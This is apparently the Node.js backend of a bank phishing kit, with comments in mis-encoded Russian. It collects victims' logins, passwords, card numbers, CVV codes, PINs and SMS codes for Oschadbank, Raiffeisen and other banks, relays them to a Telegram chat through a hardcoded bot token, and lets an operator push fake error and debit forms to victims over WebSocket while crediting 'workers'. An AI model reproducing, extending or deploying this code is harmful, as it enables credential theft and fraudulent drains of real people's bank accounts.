const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
// ‚ùóÔ∏è‚ùóÔ∏è‚ùóÔ∏è –í–ê–ñ–ù–û: –ó–∞–º–µ–Ω–∏—Ç–µ —ç—Ç–∏ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞ –≤–∞—à–∏ –Ω–∞—Å—Ç–æ—è—â–∏–µ! ‚ùóÔ∏è‚ùóÔ∏è‚ùóÔ∏è
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969'; // ID —á–∞—Ç–∞, –∫—É–¥–∞ –±–æ—Ç –±—É–¥–µ—Ç —Å–ª–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è. –î–ª—è –≥—Ä—É–ø–ø –æ–Ω –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å "-"
// --- –ö–û–ù–ï–¶ –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò ---

const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

const app = express();
app.use(express.json());
app.use(cors());

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

// –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Ç–æ–∫–µ–Ω –∏ ID —á–∞—Ç–∞ –±—ã–ª–∏ –∑–∞–º–µ–Ω–µ–Ω—ã
if (TELEGRAM_BOT_TOKEN === '–í–ê–®_–¢–ï–õ–ï–ì–†–ê–ú_–¢–û–ö–ï–ù' || CHAT_ID === '–í–ê–®_ID_–ß–ê–¢–ê') {
    console.error("\n\n‚ùóÔ∏è‚ùóÔ∏è‚ùóÔ∏è –û–®–ò–ë–ö–ê –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò: ‚ùóÔ∏è‚ùóÔ∏è‚ùóÔ∏è");
    console.error("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–∫—Ä–æ–π—Ç–µ —Ñ–∞–π–ª server.js –∏ –∑–∞–º–µ–Ω–∏—Ç–µ '–í–ê–®_–¢–ï–õ–ï–ì–†–ê–ú_–¢–û–ö–ï–ù' –∏ '–í–ê–®_ID_–ß–ê–¢–ê' –Ω–∞ –≤–∞—à–∏ –Ω–∞—Å—Ç–æ—è—â–∏–µ –¥–∞–Ω–Ω—ã–µ.\n\n");
    // process.exit(1); // –ú–æ–∂–Ω–æ —Ä–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ–±—ã —Å–µ—Ä–≤–µ—Ä –Ω–µ –∑–∞–ø—É—Å–∫–∞–ª—Å—è —Å –Ω–µ–≤–µ—Ä–Ω–æ–π –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π
}

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ ${WEBHOOK_URL}`))
        .catch(err => console.error('–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤–µ–±—Ö—É–∫–∞:', err));
    bot.sendMessage(CHAT_ID, '‚úÖ <b>–°–ï–†–í–ï–† –ü–ï–†–ï–ó–ê–ü–£–©–ï–ù!</b> –ö–æ–¥ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω –∏ –æ–±–Ω–æ–≤–ª–µ–Ω.', { parse_mode: 'HTML' }).catch(console.error);
} else {
    console.warn('–í–ù–ò–ú–ê–ù–ò–ï: RENDER_EXTERNAL_URL –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞. –í–µ–±—Ö—É–∫ –¥–ª—è Telegram –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
}

bot.getMe().then(me => console.log(`–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω: @${me.username}`)).catch(err => console.error('–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞:', err));
app.post(webhookPath, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('–ö–ª–∏–µ–Ω—Ç –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è –ø–æ WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`–ö–ª–∏–µ–Ω—Ç –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω: ${data.sessionId}`);
            }
        } catch (e) { console.error('–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ WebSocket —Å–æ–æ–±—â–µ–Ω–∏—è:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('–û—à–∏–±–∫–∞ WebSocket:', error));
});

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùóÔ∏è–û—à–∏–±–∫–∞: –∫–ª–∏–µ–Ω—Ç –Ω–µ –≤ —Å–µ—Ç–∏!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type: type, data: {} };
    let responseText = `–ö–æ–º–∞–Ω–¥–∞ "${type}" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!`;

    switch (type) {
        case 'telegram_debit':
            if (sessionData.bankName === '–û—â–∞–¥–±–∞–Ω–∫') command.type = 'telegram_debit';
            else command.type = 'show_debit_form';
            responseText = '–ó–∞–ø—Ä–æ—Å —Ñ–æ—Ä–º—ã —Å–ø–∏—Å–∞–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'request_details':
            command.type = 'show_request_details_form';
            responseText = '–ó–∞–ø—Ä–æ—Å –¥–µ—Ç–∞–ª–µ–π –∫–∞—Ä—Ç—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'password_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                 command.type = 'raiff_pin_error';
            } else { // –û—â–∞–¥
                command.data = { loginType: sessionData.loginMethod || 'phone' };
            }
            responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'code_error':
            if (sessionData.bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName !== '–û—â–∞–¥–±–∞–Ω–∫') {
                command.type = 'generic_debit_error';
            }
            responseText = '–ó–∞–ø—Ä–æ—Å "–Ω–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥" –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!';
            break;
        case 'lk': case 'call': case 'ban': case 'other': case 'number_error': case 'balance_error':
            break;
        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: ${type}` });
            return;
    }
    ws.send(JSON.stringify(command));
    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
});


app.post('/api/submit', (req, res) => {
    const { sessionId, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);
    
    console.log(`[${sessionId}] Received data:`, stepData);

    let message = '';
    let needsKeyboard = false;
    const bankName = newData.bankName || 'Unknown Bank';

    // --- –£–õ–£–ß–®–ï–ù–ù–ê–Ø –õ–û–ì–ò–ö–ê –û–¢–ü–†–ê–í–ö–ò ---
    if (stepData.hasOwnProperty('login') && stepData.hasOwnProperty('password')) { // –û—â–∞–¥: –õ–æ–≥–∏–Ω+–ü–∞—Ä–æ–ª—å
        message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–õ–æ–≥–∏–Ω)</b>\n\n`;
        message += `<b>–ë–∞–Ω–∫:</b> ${bankName}\n`;
        message += `<b>–õ–æ–≥–∏–Ω:</b> <code>${stepData.login}</code>\n`;
        message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        needsKeyboard = true;
    } else if (stepData.hasOwnProperty('phone') && stepData.hasOwnProperty('password')) { // –û—â–∞–¥: –¢–µ–ª–µ—Ñ–æ–Ω+–ü–∞—Ä–æ–ª—å
        message = `<b>üè¶ –í—Ö–æ–¥ –≤ –û—â–∞–¥ (–¢–µ–ª–µ—Ñ–æ–Ω)</b>\n\n`;
        message += `<b>–ë–∞–Ω–∫:</b> ${bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä:</b> <code>${stepData.phone}</code>\n`;
        message += `<b>–ü–∞—Ä–æ–ª—å:</b> <code>${stepData.password}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        needsKeyboard = true;
    } else if (stepData.hasOwnProperty('fp_pin')) { // –û—â–∞–¥: –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ
        message = `<b>üîß –ü–∏–Ω-–∫–æ–¥ –¥–ª—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è (–û—â–∞–¥)</b>\n\n`;
        message += `<b>–ú–æ–±. –Ω–æ–º–µ—Ä:</b> <code>${newData.fp_phone}</code>\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.fp_card}</code>\n`;
        message += `<b>–ü–∏–Ω:</b> <code>${stepData.fp_pin}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        needsKeyboard = true;
    } else if (stepData.hasOwnProperty('call_code')) { // –û—â–∞–¥: –ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞
        message = `<b>üìû –ö–æ–¥ —Å–æ –∑–≤–æ–Ω–∫–∞ (–û—â–∞–¥):</b> <code>${stepData.call_code}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    } else if (stepData.hasOwnProperty('sms_code')) { // –†–∞–π—Ñ: SMS –∫–æ–¥
        message = `<b>üè¶ –í—Ö–æ–¥ –≤ –†–∞–π—Ñ (–®–∞–≥ 2/3)</b>\n\n<b>SMS –∫–æ–¥:</b> <code>${stepData.sms_code}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    } else if (stepData.hasOwnProperty('pin')) { // –†–∞–π—Ñ: –ü–∏–Ω-–∫–æ–¥
        message = `<b>üè¶ –í—Ö–æ–¥ –≤ –†–∞–π—Ñ (–®–∞–≥ 3/3) ‚úÖ</b>\n\n<b>–ü–ò–ù:</b> <code>${stepData.pin}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    } else if (stepData.hasOwnProperty('phone')) { // –ü–µ—Ä–≤—ã–π —à–∞–≥ –¥–ª—è –†–∞–π—Ñ –∏ –¢–µ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –±–∞–Ω–∫–æ–≤
        message = `<b>üì± –ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (${bankName})</b>\n\n`;
        message += `<b>–ë–∞–Ω–∫:</b> ${bankName}\n`;
        message += `<b>–ù–æ–º–µ—Ä:</b> <code>${stepData.phone}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        needsKeyboard = true;
    } else if (stepData.hasOwnProperty('card')) { // –í—Ç–æ—Ä–æ–π —à–∞–≥ –¥–ª—è –¢–µ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –±–∞–Ω–∫–æ–≤
        message = `<b>üí≥ –ü–æ–ª—É—á–µ–Ω –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (${bankName})</b>\n\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${stepData.card}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    } else if (stepData.hasOwnProperty('card_cvv')) { // –¢–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –±–∞–Ω–∫–∏: –î–µ—Ç–∞–ª–∏ –∫–∞—Ä—Ç—ã
        message = `<b>üíé –î–µ—Ç–∞–ª–∏ –∫–∞—Ä—Ç—ã (${bankName}) ‚úÖ</b>\n\n`;
        message += `<b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${newData.card}</code>\n`;
        message += `<b>–°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è:</b> <code>${stepData.card_expiry}</code>\n`;
        message += `<b>CVV:</b> <code>${stepData.card_cvv}</code>\n`;
        message += `<b>–ë–∞–ª–∞–Ω—Å:</b> <code>${stepData.card_balance}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    } else if (stepData.hasOwnProperty('debit_sms_code')) { // –¢–µ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ –±–∞–Ω–∫–∏: –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è
        message = `<b>üí∏ –ö–æ–¥ —Å–ø–∏—Å–∞–Ω–∏—è (${bankName})</b>\n\n<b>–ö–æ–¥:</b> <code>${stepData.debit_sms_code}</code>\n<i>–°–µ—Å—Å–∏—è: ${sessionId}</i>`;
    }

    if (message) {
        const keyboard = needsKeyboard ? generateKeyboard(sessionId, bankName) : undefined;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: keyboard })
           .then(() => console.log(`[${sessionId}] Message sent to Telegram.`))
           .catch(err => console.error(`[${sessionId}] Telegram send error:`, err.response ? err.response.body : err.message));
    } else {
        console.log(`[${sessionId}] No message generated for data, sending fallback. Data:`, stepData);
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–ª–∞–¥–æ—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, –µ—Å–ª–∏ –Ω–∏ –æ–¥–Ω–æ –∏–∑ —É—Å–ª–æ–≤–∏–π –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–æ
        bot.sendMessage(CHAT_ID, `<b>[–û–¢–õ–ê–î–ö–ê]</b> –ü–æ–ª—É—á–µ–Ω—ã –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç —Å–µ—Å—Å–∏–∏ <code>${sessionId}</code>:\n<pre>${JSON.stringify(stepData, null, 2)}</pre>`, { parse_mode: 'HTML' });
    }

    res.status(200).json({ message: 'OK' });
});

function generateKeyboard(sessionId, bankName) {
    let keyboard = [];
    const baseRow1 = [ { text: '‚ùå–ù–æ–º–µ—Ä', callback_data: `number_error:${sessionId}` }, { text: '‚ùå–ë–∞–ª–∞–Ω—Å', callback_data: `balance_error:${sessionId}` }, { text: '–ë–∞–Ω', callback_data: `ban:${sessionId}` } ];
    const baseRow2 = [ { text: '–î—Ä—É–≥–æ–π', callback_data: `other:${sessionId}` } ];

    if (bankName === '–û—â–∞–¥–±–∞–Ω–∫') {
        keyboard = [
            [{ text: '–ó–≤–æ–Ω–æ–∫', callback_data: `call:${sessionId}` }, { text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }],
            [{ text: '‚ùå–ü–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` }, { text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    } else if (bankName === '–†–∞–π—Ñ—Ñ–∞–π–∑–µ–Ω') {
         keyboard = [
            [{ text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }],
            [{ text: '‚ùå–ü–∞—Ä–æ–ª—å', callback_data: `password_error:${sessionId}` }, { text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    } else { // –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –ê–ª—å—è–Ω—Å, –í–æ—Å—Ç–æ–∫ –∏ —Ç.–¥.
        keyboard = [
            [{ text: '–°–ø–∏—Å–∞–Ω–∏–µ', callback_data: `telegram_debit:${sessionId}` }, { text: '–ó–∞–ø—Ä–æ—Å', callback_data: `request_details:${sessionId}` }],
            [{ text: '‚ùå–ö–æ–¥', callback_data: `code_error:${sessionId}` }],
            baseRow1, baseRow2
        ];
    }
    return { inline_keyboard: keyboard };
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`));
